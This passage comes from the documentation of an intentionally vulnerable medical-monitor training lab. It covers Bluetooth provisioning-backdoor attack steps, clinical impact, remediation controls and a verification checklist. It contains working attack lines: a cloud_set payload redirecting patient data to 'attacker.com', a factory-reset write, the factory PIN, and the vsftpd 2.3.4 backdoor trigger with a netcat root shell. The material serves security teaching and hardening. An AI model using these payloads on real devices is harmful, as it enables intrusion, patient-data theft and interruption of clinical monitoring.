On a fresh, unprovisioned device the Cloud API URL reads **`not_configured`** — the monitor has **no backend yet** and is waiting for a technician to inject one. Instead of merely eavesdropping on an existing cloud session, the attacker can **become the cloud** by writing their own URL via `cloud_set` (Step 5) — the Android app will then send patient vitals and administrative commands to the attacker's server. On a previously provisioned device the read additionally leaks the hospital `wifi_psk` in cleartext (BLE-10).

---

#### Step 5 — SSRF / Data exfiltration redirection (P6) — *requires Step 3*

The `cloud_set` command accepts any URL without validation. An attacker can redirect all future patient vitals and device telemetry to an attacker-controlled server:

```bash
$ PAYLOAD='{"cmd":"cloud_set","url":"http://attacker.com:8080"}'
$ HEX=$(echo -n "$PAYLOAD" | xxd -ps)
[CareOtter_HR:/service0043/char0044]# write 0x7b 0x22 ...   # hex of cloud_set payload
```

The Cloud API bridge (`app.py`) forwards IGP commands to this new URL, giving the attacker a live feed of patient data and administrative commands.

---

#### Step 6 — Factory reset gated only by the factory PIN (P7) — *requires Step 3*

Once the PIN gate has been passed in Step 3, a single write to `0xFF11` with `factory_reset` wipes the device configuration and reboots the WiFi stack, causing a clinical service interruption:

```bash
[CareOtter_HR:/service0043/char0044]# write 0x7b 0x22 0x63 0x6d 0x64 0x22 0x3a 0x22 0x66 0x61 0x63 0x74 0x6f 0x72 0x79 0x5f 0x72 0x65 0x73 0x65 0x74 0x22 0x7d
```

(Or generate with `echo -n '{"cmd":"factory_reset"}' | xxd -ps` → `7b22636d64223a22666163746f72795f7265736574227d`)

What makes this a P7-class flaw — even with the PIN gate active — is the **complete absence of a second confirmation factor on a destructive operation**: no physical button press, no admin re-authentication over the Cloud API, no time-delayed confirmation prompt. The **same** low-entropy factory PIN that gates `wifi_set` and `cloud_set` is also sufficient to permanently wipe patient configuration. Real medical devices typically require an additional out-of-band confirmation (hardware tamper switch, dual-operator approval, or a TLS-authenticated admin command from the hospital backend) for any reset that takes the monitor offline; CareOtter requires none.

Negative control — verifies the gate is active and Step 3 is mandatory:

```bash
# Reconnect from a fresh BLE session (or after `ble-server restart`) so the
# `authenticated` flag is False, then write factory_reset WITHOUT writing the PIN:
[CareOtter_HR:/service0043/char0044]# write 0x7b 0x22 0x63 0x6d 0x64 0x22 0x3a 0x22 0x66 0x61 0x63 0x74 0x6f 0x72 0x79 0x5f 0x72 0x65 0x73 0x65 0x74 0x22 0x7d

# On the Pi:
logread -e BLE | tail -1
# →  "[BLE] Provisioning command rejected — PIN not verified"
# The configuration is intact; the device does NOT reboot.
```

---

### Clinical Impact

The Factory Provisioning Channel transforms a **transient proximity attack** (Bluetooth range) into **full device compromise**:

| Stage | Consequence | Patient Safety Risk |
|---|---|---|
| P5 — WiFi PSK leak / unprovisioned state | Attacker joins hospital WiFi OR discovers device has no backend yet | High — network breach OR attacker becomes the cloud |
| P6 — Cloud URL injection + signature capture | Attacker-supplied backend receives factory signature + admin creds; replays to real cloud → permanent admin takeover | Critical — complete backend compromise |
| P4 — Shell injection | Root RCE on bedside monitor | Critical — device takeover |
| P7 — Factory reset gated only by hardcoded PIN | Monitor goes offline; alerts stop; nurses lose telemetry. Trivially reached via Step 3 once the PIN is known or brute-forced | Critical — silent care interruption |

---

### Chain F — Cloud API Impersonation via Signature Interception

This chain exploits the hidden BLE Factory Provisioning Service (`0xFF10`) to redirect the device's backend to an attacker-controlled server, capture the hardcoded factory signature, and replay it to the real Cloud API for permanent admin takeover. It requires only Bluetooth range and completes in under three minutes.

- **Prerequisites:** Bluetooth range (~10–30 m). No pairing, no network access, no IGP token.
- **Execution time:** < 3 minutes with a smartphone.
- **Impact:** Complete backend takeover (admin account) + root RCE + patient data exfiltration.

---

### How It Should Be

Remediation requires four independent controls:

1. **Remove the hidden service from production firmware.** The factory provisioning channel must be compiled out of the production image and re-introduced only via a physical jumper / tamper switch detected at boot. Hidden services discoverable via standard GATT enumeration are not a security boundary.
2. **Per-device random PIN provisioned at manufacturing**, written to a sticker inside the chassis and bound to the device serial number. Eliminates CWE-798 (no shared factory secret) and turns brute-force into an offline attack against a single unit.
3. **Permanent lockout after N failed attempts** (typical: 5 attempts → cool-down escalating to permanent lock that requires factory service). Eliminates CWE-307. The current cyclic counter (`max(0, 3 - (pin_attempts % 3))`) actively misleads defenders and must be replaced with a monotonic, persisted counter.
4. **Time-bound `authenticated` session with explicit revoke on disconnect.** Bind the `authenticated=True` flag to the BLE connection handle and clear it on any disconnect, plus a hard ceiling (e.g. 5 min) that auto-clears even on persistent connections. Eliminates CWE-613 / P8.

Additionally, every JSON command on `0xFF11` should be parsed against a strict allow-list and parameter shapes (`wifi_set`, `cloud_set`, `factory_reset`, …); shell-style construction (`os.system(f"… {ssid} …")`) must be replaced by direct UCI Python bindings or `subprocess.run([...], shell=False)` with argv arrays.

---

### Controls to Implement

| Layer | Measure | Objective |
|---|---|---|
| BLE | Remove `0xFF10` from production builds; gate behind hardware tamper switch | Eliminate the hidden interface entirely on shipped devices |
| BLE | LE Secure Connections + bonding for any retained provisioning channel | Ensure only paired, authenticated technicians can connect |
| Auth | Per-device random factory PIN bound to serial number | Eliminate fleet-wide credential reuse (CWE-798) |
| Auth | Monotonic persisted attempt counter + permanent lockout | Stop brute force (CWE-307) |
| Session | Connection-bound `authenticated` flag with hard timeout | Stop indefinite session reuse (CWE-613, P8) |
| Firmware | Allow-listed JSON commands + argv-style subprocess calls | Eliminate shell injection (CWE-78) |
| Firmware | URL allow-list for `cloud_set` (TLS-only, signed manifest) | Eliminate SSRF / cloud impersonation (CWE-918) |
| Privacy | Encrypt PSK at rest; never expose via `ReadValue` | Stop plaintext credential disclosure (CWE-312) |
| Audit | Immutable write log with client BD_ADDR and timestamp | Enable post-incident forensic tracing |

---


## How It Should Be

- **Decommission what is not needed.** A bedside monitor does not need FTP, Telnet, SNMP, UPnP, HL7, DICOM, Modbus or SMB exposed. Remove the daemons and close the firewall ports — the secure-mode toggle for the FTP service models exactly this.
- **Authenticate every service.** The HTTP sensor (`:8081`) and any control endpoint must require credentials, not trust the local network.
- **Encrypt the transport.** The IGP admin channel (`:9999`) must run over TLS so the token and the WiFi PSK are not sniffable.
- **Keep software current.** No service should run an unmaintained release with a public exploit. Track versions and patch or replace — the `vsftpd 2.3.4` lure is the anti-pattern.
- **Default-deny the edge.** The WAN zone should be `input=REJECT` with an explicit allow-list, not `ACCEPT` with everything pre-opened.

---

## Controls to Implement

| Layer | Measure | Objective |
|-------|---------|-----------|
| Attack surface | Remove unused daemons, close their firewall ports, WAN default-deny | Eliminate I2 exposure (CWE-1104) |
| Software supply | Inventory service versions, patch/replace unmaintained ones | Kill the public-exploit path (CWE-1104 / CWE-912) |
| AuthN | Credentials on `:8081` and every control endpoint | Stop unauthenticated commands (CWE-306) |
| Transport | TLS on the IGP admin channel `:9999` | Stop token/PSK sniffing (CWE-319) |
| Least privilege | Do not run network daemons as root | Contain a compromised service (CWE-250) |

---

## Verification Checklist

- [ ] **§2.1**: `nmap -p9999` open. A `tcpdump` on the segment captures the IGP token and WiFi PSK in cleartext during an admin session.
- [ ] **§2.2**: direct `POST :8081/thresholds` without `X-API-Key` returns `unauthorized`. The alarm-silencing change is reached via the Cloud API BFLA `POST /api/config/thresholds` with a patient JWT (API5), proxied to the device over IGP.
- [ ] **§2.3 (vulnerable)**: `nmap -sV -p21` → `vsftpd 2.3.4`. `USER x:)` + `PASS x` then `nc <pi> 6200` → `uid=0(root)`.
- [ ] **§2.3 (secure)**: `careotter.@careotter[0].ftp_secure=1` + restart → `:21` closed (`nmap -p21` not open), the `:)` trick has no target.
- [ ] **Firewall**: the WAN zone is `input=ACCEPT` and `Allow-FTP`/`Allow-*` rules are present (the ports are reachable from the home WiFi side).
- [ ] **Binary lure**: `strings /opt/careotter-ftp/careotter-ftp | grep 'vsFTPd 2.3.4'` (binary not stripped).
- [ ] **§2.4 (discovery)**: after `connect`, `bluetoothctl list-attributes` exposes the un-advertised secondary service `0xFF10` with characteristics `0xFF11`/`0xFF12`; writing the factory PIN `6767` to `0xFF12` flips `authenticated` to true (Pi log: `Provisioning AUTH success`).
- [ ] **§2.4 (RCE / SSRF)**: a `wifi_set` payload with shell metacharacters written to `0xFF11` drops `/tmp/careotter_rce_marker` on the Pi as root; `cloud_set` accepts an attacker URL without validation; a `factory_reset` write pre-PIN is rejected (`Provisioning command rejected — PIN not verified`).

---

## Glossary

| Term     | Definition                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                  |
| -------- | ------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- |
| **CSCP** | **CareOtter Secure Config Protocol** (version 1, "CSCP v1"). The vendor's proprietary BLE format for writing clinical alert thresholds (`bpm_min`, `bpm_max`, `spo2_min`) to GATT characteristic `0xFF01`. A 24-byte packet: `[magic 4B = 0xCAFE0DDA][CRC32 4B over the ciphertext][AES-128-ECB(3 threshold bytes + 13 null pad) 16B]`, keyed with the fleet-wide constant `careotter-key-16`. Marketed as "AES-128 military-grade encryption." Note for this page: CSCP is **not** the protocol of the §2.4 provisioning backdoor — §2.4 speaks the hidden provisioning service (`0xFF10` with command char `0xFF11` and PIN char `0xFF12`, factory PIN `6767`), a different GATT surface on the same radio. CSCP threshold forging is the adjacent BLE case that used to sit beside this write-up and was re-classified to [[IoT7_Insecure_Data_Transfer_and_Storage]] §7.1. The term appears here only in those cross-references. Expanded in `docs/CareOtter/Architecture_Analysis.md`. |

---

## References

- Migrated from `docs/CareOtter/IoT/CareOtter_IoT.md` §IoT:I2 (2.1, 2.2).
- Spec: `stages/01_spec/output/IoT-I2-ftp-rce-spec.md` (the §2.3 legacy-FTP RCE).
- `labs/careotter/careotter-ftp.c` (the daemon), `files/etc/init.d/careotter-ftp`, `files/usr/lib/vulnzoo-hooks/profile-init.d/72-careotter-ftp.sh`, `opt/careotter-ftp/CONTEXT.md`.
- `labs/careotter/files/usr/lib/vulnzoo-hooks/profile-init.d/75-firewall.sh` (opens `:21` and the rest of the surface).
- CVE-2011-2523 (vsftpd 2.3.4 backdoor)
- Related: `IoT1_Weak_Guessable_Hardcoded_Passwords.md` (the IGP token), CareOtter_IoT.md §IoT:I7/I9 (the careservice memory-corruption RCEs — also I2-class).
- §2.4 sources: `Vulns/Mobile/BLE-07_CSCP_Threshold_Forging.md` (the standalone write-up, now duplicated by §2.4 below) and `CareOtter_IoT.md` §3.4 + §Chain F (Cloud API impersonation).
- `labs/careotter/files/opt/medical-sensor/ble_server.py` — `ProvisioningConfigChrc`, `ProvisioningAuthChrc`, `PROV_PIN_FACTORY`.
- Re-classified BLE siblings split out of the old §IoT:I3: [[IoT6_Insufficient_Privacy_Protection]] (§3.1/3.2 passive leaks), [[IoT7_Insecure_Data_Transfer_and_Storage]] (§3.3 CSCP threshold forging).
